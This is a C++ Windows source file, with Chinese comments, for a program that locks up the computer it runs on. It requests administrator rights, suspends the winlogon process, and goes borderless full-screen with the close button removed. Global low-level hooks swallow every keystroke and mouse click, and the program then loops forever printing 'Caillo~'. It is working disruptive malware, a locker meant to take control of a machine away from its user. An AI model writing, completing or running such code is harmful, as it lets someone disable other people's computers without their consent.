#include<bits/stdc++.h>
#include"../process.h"
#include"../RegFunc.h"
#include<windows.h>
#include<string>
#include<cstdlib>
using namespace std;

bool setSize(int NewSize) {
	// 获取控制台窗口句柄
	HANDLE consoleHandle = GetStdHandle(STD_OUTPUT_HANDLE);
	
// 定义控制台字体信息结构体
	CONSOLE_FONT_INFOEX font;
	font.cbSize = sizeof(font);
	
// 获取当前控制台字体信息
	GetCurrentConsoleFontEx(consoleHandle, FALSE, &font);
	
// 设置字体大小为20
	font.dwFontSize.X = NewSize;
	font.dwFontSize.Y = NewSize;
	
// 应用新的字体信息
	SetCurrentConsoleFontEx(consoleHandle, FALSE, &font);
}



void full_screen()
{
	HWND hwnd = GetForegroundWindow();
	int cx = GetSystemMetrics(SM_CXSCREEN);            /* 屏幕宽度 像素 */
	int cy = GetSystemMetrics(SM_CYSCREEN);            /* 屏幕高度 像素 */
	
	LONG l_WinStyle = GetWindowLong(hwnd, GWL_STYLE);   /* 获取窗口信息 */
	/* 设置窗口信息 最大化 取消标题栏及边框 */
	SetWindowLong(hwnd, GWL_STYLE, (l_WinStyle | WS_POPUP | WS_MAXIMIZE) & ~WS_CAPTION & ~WS_THICKFRAME & ~WS_BORDER);
	
	SetWindowPos(hwnd, HWND_TOP, 0, 0, cx, cy, 0);
}

// 全局钩子句柄
HHOOK keyboardHook;

// 钩子回调函数
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
// 阻止所有按键
		return 1;
	}
	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

// 定义全局的钩子句柄
HHOOK mouseHook;

// 鼠标钩子回调函数
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
// 检查是否为鼠标按键事件
		if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN)
		{
// 屏蔽鼠标按键事件，使其不再执行
			return 1;
		}
	}
}

/*BOOL OnForceShow(HWND hWnd)
{
	HWND hForeWnd = NULL;
	DWORD dwForeID = 0;
	DWORD dwCurID = 0;
	
	hForeWnd = ::GetForegroundWindow();
	dwCurID = ::GetCurrentThreadId();
	dwForeID = ::GetWindowThreadProcessId(hForeWnd, NULL);
	::AttachThreadInput(dwCurID, dwForeID, TRUE);
	::ShowWindow(hWnd, SW_SHOWNORMAL);
	::SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE);
	::SetWindowPos(hWnd, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE);
	::SetForegroundWindow(hWnd);
	// 将前台窗口线程贴附到当前线程（也就是程序A中的调用线程）
	::AttachThreadInput(dwCurID, dwForeID, FALSE);
	
	return TRUE;
}*/

int main () {
	//OnForceShow(GetStdHandle(STD_OUTPUT_HANDLE));
	RequestAdminRightsWithArgs();
	EnableDebugPrivilege();
	setSize(200);
	full_screen();
	SuspendProcess(getSinglePid("winlogon"));
	DeleteMenu(GetSystemMenu(GetConsoleWindow(),FALSE),SC_CLOSE,MF_BYCOMMAND);
	DrawMenuBar(GetConsoleWindow());
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
	// 创建鼠标钩子
	mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0);
	MSG msg;
	cout<<"Caillo~";
	
	int Damn=1;int last_change=clock();
	while(1){
		if(GetMessage(&msg, NULL, 0, 0)){
		TranslateMessage(&msg);
		DispatchMessage(&msg);
		}
	}
	return 0;
}
